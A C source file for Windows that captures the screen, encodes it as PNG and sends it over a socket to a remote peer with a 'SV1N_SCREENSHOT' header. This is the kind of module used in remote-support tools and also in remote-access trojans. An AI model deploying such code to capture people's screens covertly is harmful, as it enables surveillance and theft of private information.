#include <winsock2.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include "client.h"
#include "SCREENSHOT.h"

int sendMessage(SOCKET socket, const char* message, size_t length)
{
    if (message == NULL || length == 0 || length > MAX_MESSAGE_SIZE)
        return SOCKET_ERROR;

    uint32_t networkLength = htonl((uint32_t)length);

    int result = sendAll(
        socket,
        (const char*)&networkLength,
        sizeof(networkLength)
    );

    if (result != sizeof(networkLength))
        return SOCKET_ERROR;

    result = sendAll(socket, message, (int)length);

    if (result != (int)length)
        return SOCKET_ERROR;

    return result;
}



int sendScreenshot(SOCKET clientSocket)
{
    int width = 0;
    int height = 0;

    unsigned char* pixels = takeScreenshotPixels(&width, &height);

    if (pixels == NULL) {
        printf("[ERROR] Screenshot capture failed\n");
        return 0;
    }

    unsigned char* pngData = NULL;
    size_t pngSize = 0;

    int encodeResult = encodeScreenshotPNG(
        pixels,
        width,
        height,
        &pngData,
        &pngSize
    );

    free(pixels);

    if (!encodeResult || pngData == NULL) {
        free(pngData);
        return 0;
    }

    if (pngSize == 0 || pngSize > INT_MAX) {
        free(pngData);
        return 0;
    }

    char message[256];

    int msgLen = snprintf(
        message,
        sizeof(message),
        "SV1N_SCREENSHOT %zu",
        pngSize
    );

    if (msgLen < 0 || msgLen >= sizeof(message)) {
        free(pngData);
        return 0;
    }

    // Send metadata
    int result = sendMessage(
        clientSocket,
        message,
        (size_t)msgLen
    );

    if (result != msgLen) {
        free(pngData);
        return 0;
    }

    // Send raw PNG
    result = sendAll(
        clientSocket,
        pngData,
        (int)pngSize
    );

    free(pngData);

    if (result != (int)pngSize) {
        printf("[ERROR] PNG transmission failed\n");
        return 0;
    }

    printf("[SUCCESS] Screenshot sent: %zu bytes\n", pngSize);

    return 1;
}
